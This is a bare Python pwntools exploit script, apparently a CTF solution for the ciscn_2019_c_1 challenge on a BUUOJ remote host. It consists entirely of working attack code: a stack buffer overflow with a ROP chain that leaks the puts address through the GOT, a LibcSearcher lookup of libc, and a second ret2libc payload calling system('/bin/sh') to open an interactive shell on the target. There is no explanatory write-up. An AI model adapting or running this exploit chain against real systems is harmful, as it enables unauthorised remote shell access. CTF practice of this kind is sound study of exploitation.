# exp

```python
from pwn import *
from LibcSearcher import *

content = 1
context(os='linux', arch='amd64', log_level='debug')

remote_env = 'node4.buuoj.cn:28141'
local_env = './ciscn_2019_c_1'

elf = ELF(local_env)
ret_addr = 0x00000000004006b9
pop_rdi_addr = 0x0000000000400c83

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

log.success('puts_plt = ' + hex(puts_plt))
log.success('puts_got = ' + hex(puts_got))
log.success('main_addr = ' + hex(main_addr))

if content:
    sh = remote(remote_env.split(':')[0], int(remote_env.split(':')[1]))
else:
    sh = process(local_env)

payload_leak_libc = '\0' + 'a' * (0x50 + 7)
payload_leak_libc += p64(pop_rdi_addr)
payload_leak_libc += p64(puts_got)
payload_leak_libc += p64(puts_plt)
payload_leak_libc += p64(main_addr)

sh.sendlineafter('Input your choice!\n', '1')
sh.sendlineafter('Input your Plaintext to be encrypted\n', payload_leak_libc)
sh.recvuntil('Ciphertext\n')
sh.recvuntil('\n')

puts_addr = u64(sh.recvuntil('\n', drop=True).ljust(8, '\x00'))
log.success('puts_addr = ' + hex(puts_addr))

libc = LibcSearcher('puts',puts_addr)
libc_base_addr = puts_addr - libc.dump('puts')
binsh_addr = libc_base_addr + libc.dump('str_bin_sh')
system_addr = libc_base_addr + libc.dump('system')

log.success('libc_base_addr = ' + hex(libc_base_addr))
log.success('binsh_addr = ' + hex(binsh_addr))
log.success('system_addr = ' + hex(system_addr))

payload_attack = '\0' + 'a' * (0x50 + 7)
payload_attack += p64(ret_addr)
payload_attack += p64(pop_rdi_addr)
payload_attack += p64(binsh_addr)
payload_attack += p64(system_addr)

sh.sendlineafter('Input your choice!\n', '1')
sh.sendlineafter('Input your Plaintext to be encrypted\n', payload_attack)

sh.interactive()
```